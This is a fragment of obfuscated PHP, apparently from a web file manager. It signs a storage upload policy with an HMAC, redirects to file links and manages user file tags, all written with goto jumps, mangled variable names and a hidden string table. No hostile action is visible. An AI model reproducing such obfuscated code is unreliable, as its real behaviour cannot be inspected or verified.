$EÆÂ±Í÷‹†[1203] => $c³©„Şùæ·, $EÆÂ±Í÷‹†[1204] => $BÜˆçÏ÷Öö, $EÆÂ±Í÷‹†[175] => $this->getHost()); goto fƒ¢Òààîà; C‰ğ¾ƒ«õÍ: $B¸Ÿ†ßø = $EÆÂ±Í÷‹†[1190]; $f¯­˜æö¾ = gmdate($EÆÂ±Í÷‹†[1191], time() + $D“‡¬±‘Ôó); $c³©„Şùæ· = (string) time() . $EÆÂ±Í÷‹†[68] . (string) (time() + $D“‡¬±‘Ôó); goto BŠä¼µ¦; fƒ¢Òààîà: return $C¢ÃÁä—˜£; goto Bà£‚‰˜š˜; BŠä¼µ¦: $dô—Ç˜ô¾× = array($EÆÂ±Í÷‹†[1192] => $f¯­˜æö¾, $EÆÂ±Í÷‹†[1193] => array(array($EÆÂ±Í÷‹†[1194] => $fÍÊŒ‡†ñº), array($EÆÂ±Í÷‹†[1195] => $this->bucket), array($EÆÂ±Í÷‹†[1196], $EÆÂ±Í÷‹†[1197], $EÆÂ±Í÷‹†[33]), array($EÆÂ±Í÷‹†[1198] => $B¸Ÿ†ßø), array($EÆÂ±Í÷‹†[1199] => $a‰ĞªŒŠğ¤), array($EÆÂ±Í÷‹†[1200] => $this->accessKey), array($EÆÂ±Í÷‹†[1201] => $c³©„Şùæ·))); $dô—Ç˜ô¾× = json_encode($dô—Ç˜ô¾×); $A×øªššæ = hash_hmac($EÆÂ±Í÷‹†[230], $c³©„Şùæ·, $this->secret); goto eŠ£ËÔíÈ¥; Bà£‚‰˜š˜: } public function fileOutLink($CÉîİ“ë›) { $bâ™Ëâ‰† =& $_SERVER[«¾°Ã¤]; if (substr($CÉîİ“ë›, 0, 7) == $bâ™Ëâ‰†[1205]) { $CÉîİ“ë› = $bâ™Ëâ‰†[1206] . substr($CÉîİ“ë›, 7); } header($bâ™Ëâ‰†[159] . $CÉîİ“ë›); die; } } goto f³ƒõ©…Æ; B“°áøŒä: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\162\137\x66\141\x76"; protected function cacheFunctionAlias($BÅâ´æàÅ) { $Fë¾­·äµ =& $_SERVER[«¾°Ã¤]; return array($Fë¾­·äµ[1795] => array(USER_ID, $Fë¾­·äµ[1796])); } protected function listData() { $e† ¶òœŞâ =& $_SERVER[«¾°Ã¤]; $F‚™î—ÍÒŠ = array($e† ¶òœŞâ[1521] => USER_ID, $e† ¶òœŞâ[472] => array($e† ¶òœŞâ[1799], 0)); $bíîƒ“Ë«‹ = $e† ¶òœŞâ[1801]; $dù¿À©Ë‘é = $this->field($bíîƒ“Ë«‹)->where($F‚™î—ÍÒŠ)->order($e† ¶òœŞâ[1802])->select(); return $dù¿À©Ë‘é ? $dù¿À©Ë‘é : array(); } protected function listByTag($fˆ‚ŒÚÉ) { } protected function addToTag($bõ™öÏĞ‚, $aÎâÌ¦â) { $BÇ´ÑÚöà‚ =& $_SERVER[«¾°Ã¤]; if (!Model($BÇ´ÑÚöà‚[1937])->listData($aÎâÌ¦â) || !Model($BÇ´ÑÚöà‚[799])->pathInfo($bõ™öÏĞ‚)) { return !1; } $cÆãšùÀÇ¦ = array($BÇ´ÑÚöà‚[1521] => USER_ID, $BÇ´ÑÚöà‚[472] => $aÎâÌ¦â, $BÇ´ÑÚöà‚[423] => $bõ™öÏĞ‚, $BÇ´ÑÚöà‚[424] => $BÇ´ÑÚöà‚[418], $BÇ´ÑÚöà‚[422] => $BÇ´ÑÚöà‚[33], $BÇ´ÑÚöà‚[1697] => 0); if ($this->where($cÆãšùÀÇ¦)->find()) { return !1; } return $this->add($cÆãšùÀÇ¦); } protected function removeFromTag($aÏ°¸‰é‹Ø, $E˜ïÓ×§œ¿) { $CÁ‚¿ôîÌ =& $_SERVER[«¾°Ã¤]; if (!Model($CÁ‚¿ôîÌ[1937])->listData($E˜ïÓ×§œ¿)) { return !1; } if (is_array($aÏ°¸‰é‹Ø)) { $aÏ°¸‰é‹Ø = array($CÁ‚¿ôîÌ[7], $aÏ°¸‰é‹Ø); } $C‰°ò˜¾‰ = array($CÁ‚¿ôîÌ[1521] => USER_ID, $CÁ‚¿ôîÌ[472] => $E˜ïÓ×§œ¿, $CÁ‚¿ôîÌ[424] => $CÁ‚¿ôîÌ[418], $CÁ‚¿ôîÌ[423] => $aÏ°¸‰é‹Ø); return $this->where($C‰°ò˜¾‰)->delete(); } protected function removeByTag($Dò¸ÆÌí¥×) { $aíÌğµ»™½ =& $_SERVER[«¾°Ã¤]; if (!$Dò¸ÆÌí¥×) { return !1; } $a«Ï„Ù‡ã = array($aíÌğµ»™½[1521] => USER_ID, $aíÌğµ»™½[472] => $Dò¸ÆÌí¥×); return $this->where($a«Ï„Ù‡ã)->delete(); } protected function removeBySource($E™¹½±Œ§ƒ) { $e™ ºÇ…Íä =& $_SERVER[«¾°Ã¤]; if (is_array($E™¹½±Œ§ƒ)) { $E™¹½±Œ§ƒ = array($e™ ºÇ…Íä[7], $E™¹½±Œ§ƒ); } $B¨’èœÛ¬Ê = array($e™ ºÇ…Íä[1521] => USER_ID, $e™ ºÇ…Íä[423] => $E™¹½±Œ§ƒ, $e™ ºÇ…Íä[472] => array($e™ ºÇ…Íä[972], 0)); return $this->where($B¨’èœÛ¬Ê)->delete(); } }